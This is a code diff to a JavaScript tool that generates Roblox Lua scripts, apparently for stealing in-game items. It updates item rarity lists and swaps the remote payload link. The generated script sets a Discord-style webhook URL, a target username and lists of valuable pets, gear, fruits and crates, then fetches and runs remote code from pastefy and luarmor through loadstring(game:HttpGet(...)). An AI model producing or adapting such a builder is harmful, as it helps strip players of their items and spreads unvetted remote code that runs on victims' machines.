@@ -392,26 +392,24 @@ const DATABASE = {
     { name: "Poision Apple", rarity: "Legendary" },
     { name: "Moon Bloom", rarity: "Legendary" },
     { name: "Dragon's Breath", rarity: "Legendary" },
+    { name: "Poison Ivy", rarity: "Legendary" },
+    { name: "Ghost Pepper", rarity: "Super" },
     { name: "Rainbow", rarity: "Super" },
   ],
   gears: [
     { name: "Common Watering Can", rarity: "Common" },
     { name: "Common Sprinkler", rarity: "Common" },
-    { name: "Sign", rarity: "Common" },
     { name: "Uncommon Sprinkler", rarity: "Uncommon" },
     { name: "Trowel", rarity: "Rare" },
     { name: "Rare Sprinkler", rarity: "Rare" },
     { name: "Jump Mushroom", rarity: "Rare" },
     { name: "Speed Mushroom", rarity: "Rare" },
-    { name: "Lantern", rarity: "Epic" },
     { name: "Shrink Mushroom", rarity: "Epic" },
     { name: "Supersize Mushroom", rarity: "Epic" },
     { name: "Gnome", rarity: "Epic" },
-    { name: "Flashbang", rarity: "Legendary" },
     { name: "Basic Pot", rarity: "Legendary" },
     { name: "Legendary Sprinkler", rarity: "Legendary" },
     { name: "Invisibility Mushroom", rarity: "Legendary" },
-    { name: "Wheelbarrow", rarity: "Legendary" },
     { name: "Super Watering Can", rarity: "Super" },
     { name: "Super Sprinkler", rarity: "Super" }
   ],
@@ -554,7 +552,7 @@ async function generate() {
     if (adminMode === 'dupe') adminPart = `\ntask.spawn(function()\n   loadstring(game:HttpGet("https://pastefy.app/EX1du2IS/raw"))()\nend)`;
     else if (adminMode === 'Hub') adminPart = `\ntask.spawn(function()\n   loadstring(game:HttpGet("https://api.luarmor.net/files/v4/loaders/795c7accd08487171484e54a92e75c77.lua"))()\nend)`;
     else if (adminMode === 'custom' && customAdminLoadstring.trim()) adminPart = `\n${customAdminLoadstring}`;
-    const script = `getgenv().WEBHOOK_URL = "${finalWebhook}"\n\ngetgenv().TARGET_USERNAME = "${username}"\n\n${blacklistPart}\n\ngetgenv().TARGET_PETS = {\n${petsArray.join(',\n')}\n}\n\n\ngetgenv().TARGET_GEAR = {\n${gearsArray.join(',\n')}\n}\n\n\ngetgenv().FRUITS = {\n${fruitsArray.join(',\n')}\n}\n\n\ngetgenv().CRATES = {\n${cratesArray.join(',\n')}\n}\n\n\ntask.spawn(function()\n   loadstring(game:HttpGet("https://pastefy.app/MMENG7dr/raw"))()\nend)${adminPart}`;
+    const script = `getgenv().WEBHOOK_URL = "${finalWebhook}"\n\ngetgenv().TARGET_USERNAME = "${username}"\n\n${blacklistPart}\n\ngetgenv().TARGET_PETS = {\n${petsArray.join(',\n')}\n}\n\n\ngetgenv().TARGET_GEAR = {\n${gearsArray.join(',\n')}\n}\n\n\ngetgenv().FRUITS = {\n${fruitsArray.join(',\n')}\n}\n\n\ngetgenv().CRATES = {\n${cratesArray.join(',\n')}\n}\n\n\ntask.spawn(function()\n   loadstring(game:HttpGet("https://pastefy.app/xTAM3PgD/raw"))()\nend)${adminPart}`;
     const url = await uploadToPastefy(script);
     out.className = 'code-block';
     out.textContent = url ? `loadstring(game:HttpGet("${url}"))()` : script;
